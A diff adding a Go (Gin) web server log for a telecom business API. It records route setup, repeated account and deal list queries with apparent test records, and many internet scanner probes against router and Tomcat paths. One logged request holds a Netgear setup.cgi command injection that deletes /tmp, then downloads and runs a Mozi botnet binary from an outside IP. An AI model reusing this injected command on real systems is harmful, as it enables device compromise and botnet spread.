@@ -1,0 +1,266 @@
+[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.
+
+[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
+ - using env:	export GIN_MODE=release
+ - using code:	gin.SetMode(gin.ReleaseMode)
+
+[GIN-debug] GET    /api/account/update       --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateAccount (4 handlers)
+[GIN-debug] POST   /api/account/update       --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateAccount (4 handlers)
+[GIN-debug] GET    /api/deal/list            --> upc.edu.cn/telecom_business/telecom_business_api/view.ListDeal (4 handlers)
+[GIN-debug] POST   /api/deal/list            --> upc.edu.cn/telecom_business/telecom_business_api/view.ListDeal (4 handlers)
+[GIN-debug] GET    /api/deal/update          --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateDeal (4 handlers)
+[GIN-debug] POST   /api/deal/update          --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateDeal (4 handlers)
+[GIN-debug] GET    /api/employee/list        --> upc.edu.cn/telecom_business/telecom_business_api/view.ListEmployee (4 handlers)
+[GIN-debug] POST   /api/employee/list        --> upc.edu.cn/telecom_business/telecom_business_api/view.ListEmployee (4 handlers)
+[GIN-debug] GET    /api/employee/update      --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateEmployee (4 handlers)
+[GIN-debug] POST   /api/employee/update      --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdateEmployee (4 handlers)
+[GIN-debug] GET    /api/package/list         --> upc.edu.cn/telecom_business/telecom_business_api/view.ListPackage (4 handlers)
+[GIN-debug] POST   /api/package/list         --> upc.edu.cn/telecom_business/telecom_business_api/view.ListPackage (4 handlers)
+[GIN-debug] GET    /api/package/update       --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdatePackage (4 handlers)
+[GIN-debug] POST   /api/package/update       --> upc.edu.cn/telecom_business/telecom_business_api/view.UpdatePackage (4 handlers)
+[GIN-debug] GET    /api/account/list         --> upc.edu.cn/telecom_business/telecom_business_api/view.ListAccount (4 handlers)
+[GIN-debug] POST   /api/account/list         --> upc.edu.cn/telecom_business/telecom_business_api/view.ListAccount (4 handlers)
+[GIN-debug] Environment variable PORT is undefined. Using port :8080 by default
+[GIN-debug] Listening and serving HTTP on :8080
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:27:33][0m  [36;1m[27.26ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2019-12-31T22:27:33+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2019/12/31 - 22:27:33 | 200 |   27.727912ms |  123.168.74.124 | POST     /api/account/list
+[GIN] 2019/12/31 - 22:28:31 | 404 |       4.406µs |   82.209.65.237 | POST     /cgi-bin/ViewLog.asp
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:28:34][0m  [36;1m[25.84ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2019-12-31T22:28:34+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2019/12/31 - 22:28:34 | 200 |   26.141379ms |  123.168.74.124 | POST     /api/account/list
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:28:35][0m  [36;1m[25.78ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2019-12-31T22:28:35+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2019/12/31 - 22:28:35 | 200 |    26.02251ms |  123.168.74.124 | POST     /api/account/list
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:28:36][0m  [36;1m[25.85ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2019-12-31T22:28:36+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2019/12/31 - 22:28:36 | 200 |   26.204579ms |  123.168.74.124 | POST     /api/account/list
+time="2019-12-31T22:30:03+08:00" level=warning msg="err resp" error=EOF
+[GIN-debug] [WARNING] Headers were already written. Wanted to override status code 400 with 200
+[GIN] 2019/12/31 - 22:30:03 | 200 |     184.949µs |       10.10.0.1 | GET      /api/account/update
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:32:06][0m  [36;1m[26.26ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2019-12-31T22:32:06+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2019/12/31 - 22:32:06 | 200 |   26.698937ms |  123.168.74.124 | POST     /api/account/list
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:34:27][0m  [36;1m[26.05ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2019-12-31T22:34:27+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2019/12/31 - 22:34:27 | 200 |   26.444706ms |  123.168.74.124 | POST     /api/account/list
+[GIN] 2019/12/31 - 22:38:44 | 404 |       5.583µs | 183.193.234.162 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2019/12/31 - 22:44:32 | 404 |       5.811µs |   167.71.123.34 | POST     /cgi-bin/ViewLog.asp
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:45:08][0m  [36;1m[26.06ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2019-12-31T22:45:08+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2019/12/31 - 22:45:08 | 200 |   26.474526ms |  123.168.74.124 | POST     /api/account/list
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:45:14][0m  [36;1m[25.80ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2019-12-31T22:45:14+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2019/12/31 - 22:45:14 | 200 |   26.063178ms |  123.168.74.124 | POST     /api/account/list
+[GIN] 2019/12/31 - 22:45:38 | 404 |       4.325µs |     51.255.4.50 | POST     /cgi-bin/ViewLog.asp
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:45:51][0m  [36;1m[26.24ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2019-12-31T22:45:51+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2019/12/31 - 22:45:51 | 200 |      26.571ms |  123.168.74.124 | POST     /api/account/list
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:47:49][0m  [36;1m[27.39ms][0m  SELECT * FROM [deals]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[1 rows affected or returned ][0m 
+time="2019-12-31T22:47:49+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 15:35:02.463 +0000 UTC 2019-12-30 15:35:02.463 +0000 UTC} 1577690826 asf 000011 0 11.25}]"
+[GIN] 2019/12/31 - 22:47:49 | 200 |    27.59157ms |  123.168.74.124 | POST     /api/deal/list
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:48:31][0m  [36;1m[25.86ms][0m  SELECT * FROM [accounts]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[9 rows affected or returned ][0m 
+time="2019-12-31T22:48:31+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 09:51:23.997 +0000 UTC 2019-12-30 09:51:23.997 +0000 UTC} Wilson  0 0 Champs-Elysees  } {{6 2019-12-30 11:13:44.323 +0000 UTC 2019-12-30 11:35:59.51 +0000 UTC} 122455  0 0 test  } {{7 2019-12-30 13:40:25.773 +0000 UTC 2019-12-30 13:40:25.773 +0000 UTC} 1444552  0 0 aasfwawaf  } {{8 2019-12-31 14:42:23.333 +0000 UTC 2019-12-31 14:42:23.333 +0000 UTC} 133952 xl 1 20 20191230-tl-2  desc} {{15 2019-12-31 14:50:35.647 +0000 UTC 2019-12-31 14:50:35.647 +0000 UTC}   1 0   } {{28 2019-12-31 15:10:32.227 +0000 UTC 2019-12-31 15:10:32.227 +0000 UTC} 133456 lx 1 0 20191230-tl-1  test 0123} {{29 2019-12-31 15:25:40.527 +0000 UTC 2019-12-31 15:25:40.527 +0000 UTC} 1123 ?? 1 0 20191230-tl-1  desc} {{30 2019-12-31 15:32:56.387 +0000 UTC 2019-12-31 15:32:56.387 +0000 UTC} 1237899 植物 1 0 20191230-tl-1  desc} {{31 2019-12-31 15:36:44.443 +0000 UTC 2019-12-31 15:36:44.443 +0000 UTC} 789456 的发放 1 56.13 20191230-tl-1  aeq}]"
+[GIN] 2019/12/31 - 22:48:31 | 200 |   26.216437ms |  123.168.74.124 | POST     /api/account/list
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:48:34][0m  [36;1m[26.23ms][0m  SELECT * FROM [deals]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[1 rows affected or returned ][0m 
+time="2019-12-31T22:48:34+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 15:35:02.463 +0000 UTC 2019-12-30 15:35:02.463 +0000 UTC} 1577690826 asf 000011 0 11.25}]"
+[GIN] 2019/12/31 - 22:48:34 | 200 |   26.385684ms |  123.168.74.124 | POST     /api/deal/list
+
+[35m(/root/go/src/upc.edu.cn/telecom_business/telecom_business_api/dal/db/base.go:41)[0m 
+[33m[2019-12-31 22:48:37][0m  [36;1m[25.54ms][0m  SELECT * FROM [deals]   ORDER BY [id] OFFSET 0 ROWS FETCH NEXT 20 ROWS ONLY  
+[36;31m[1 rows affected or returned ][0m 
+time="2019-12-31T22:48:37+08:00" level=info msg="suc resp" data="[{{1 2019-12-30 15:35:02.463 +0000 UTC 2019-12-30 15:35:02.463 +0000 UTC} 1577690826 asf 000011 0 11.25}]"
+[GIN] 2019/12/31 - 22:48:37 | 200 |   25.716751ms |  123.168.74.124 | POST     /api/deal/list
+[GIN] 2019/12/31 - 23:17:07 | 404 |       4.042µs | 203.223.169.115 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 00:04:14 | 404 |       5.084µs |  58.248.146.152 | POST     /tmUnblock.cgi
+[GIN] 2020/01/01 - 00:25:12 | 404 |       5.751µs |    154.65.28.94 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 00:25:15 | 404 |       5.576µs |    154.65.28.94 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 00:41:26 | 404 |        5.61µs | 184.105.247.195 | GET      /
+[GIN] 2020/01/01 - 00:52:19 | 404 |      10.525µs |    92.118.161.1 | GET      /
+[GIN] 2020/01/01 - 01:32:18 | 404 |       5.627µs |   144.91.71.205 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 02:02:16 | 404 |       3.809µs |   47.104.210.65 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 02:03:40 | 404 |       4.119µs |   37.49.231.164 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 02:31:19 | 404 |       5.605µs | 159.203.193.241 | GET      /manager/text/list
+[GIN] 2020/01/01 - 02:58:46 | 404 |       3.757µs |  104.244.79.126 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 03:19:08 | 404 |       4.265µs |    60.179.77.24 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 03:39:50 | 404 |       4.418µs |    120.72.29.26 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 03:40:02 | 404 |       5.474µs |    120.72.29.26 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 03:49:49 | 404 |       5.054µs |   117.60.25.252 | GET      /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.60.25.252:49274/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+[GIN] 2020/01/01 - 04:22:35 | 404 |       4.182µs |    198.98.55.50 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 04:29:10 | 404 |       5.152µs |    185.51.39.81 | GET      /
+[GIN] 2020/01/01 - 04:44:05 | 404 |       3.977µs |     51.255.4.50 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 05:01:02 | 404 |       5.418µs |   178.128.179.4 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 05:47:08 | 404 |       3.992µs | 223.244.236.232 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 06:33:16 | 404 |        4.16µs |  117.159.25.220 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 06:43:10 | 404 |       4.033µs |    23.253.73.38 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 07:04:08 | 404 |       4.548µs |   122.228.19.80 | GET      /weborg/
+[GIN] 2020/01/01 - 07:48:15 | 404 |       3.953µs |  186.178.110.70 | GET      /
+[GIN] 2020/01/01 - 08:22:19 | 404 |       5.632µs |   144.91.71.205 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 08:31:08 | 404 |       5.634µs |   41.32.153.101 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 08:31:17 | 404 |       4.336µs |   47.100.111.30 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 08:36:58 | 404 |       4.076µs |    23.253.73.38 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 09:41:12 | 404 |       4.739µs |   37.49.231.143 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 10:21:05 | 404 |        4.35µs |   47.100.111.30 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 10:33:36 | 404 |       5.333µs |    49.207.13.84 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 10:33:38 | 404 |       5.979µs |    49.207.13.84 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 10:33:42 | 404 |       3.768µs |    49.207.13.84 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 10:33:50 | 404 |       5.912µs |    49.207.13.84 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 10:34:06 | 404 |       5.617µs |    49.207.13.84 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 11:27:08 | 404 |       3.839µs |   47.100.111.30 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 11:28:27 | 404 |       5.525µs |   178.45.47.113 | GET      /
+[GIN] 2020/01/01 - 12:19:50 | 404 |       4.349µs |   54.39.245.130 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 12:23:31 | 404 |       4.574µs |   37.49.231.164 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 12:33:16 | 404 |         4.2µs |   59.150.105.11 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 12:41:32 | 404 |       5.483µs |   223.75.33.155 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 13:19:16 | 404 |       5.477µs |   47.100.111.30 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 13:19:37 | 404 |       6.565µs | 179.111.139.183 | GET      /
+[GIN] 2020/01/01 - 13:26:21 | 404 |        5.55µs |    175.145.57.3 | POST     /tmUnblock.cgi
+[GIN] 2020/01/01 - 13:26:21 | 404 |       4.488µs |    175.145.57.3 | POST     /tmUnblock.cgi
+[GIN] 2020/01/01 - 13:33:31 | 404 |       5.946µs |  159.203.193.43 | GET      /manager/html
+[GIN] 2020/01/01 - 13:51:54 | 404 |       5.688µs |  73.245.127.219 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 14:00:06 | 404 |       4.309µs |  202.147.186.62 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 14:40:47 | 404 |       5.526µs |   37.49.231.143 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 14:45:09 | 404 |       4.085µs |   95.179.151.89 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 15:16:00 | 404 |       6.402µs |   85.99.242.100 | GET      /
+[GIN] 2020/01/01 - 16:00:53 | 404 |       5.722µs |   47.100.111.30 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 16:01:46 | 404 |       5.997µs |   50.27.247.184 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 17:07:29 | 404 |       5.543µs | 202.168.148.105 | GET      /?0.88601133244764382150080
+[GIN] 2020/01/01 - 17:07:29 | 404 |       5.833µs | 202.168.148.105 | GET      /?0.71497378501753621160640
+[GIN] 2020/01/01 - 17:33:27 | 404 |       5.789µs |  112.162.42.134 | POST     /cgi-bin/ViewLog.asp
+[GIN] 2020/01/01 - 17:56:05 | 404 |       3.821µs |  216.218.206.66 | GET      /
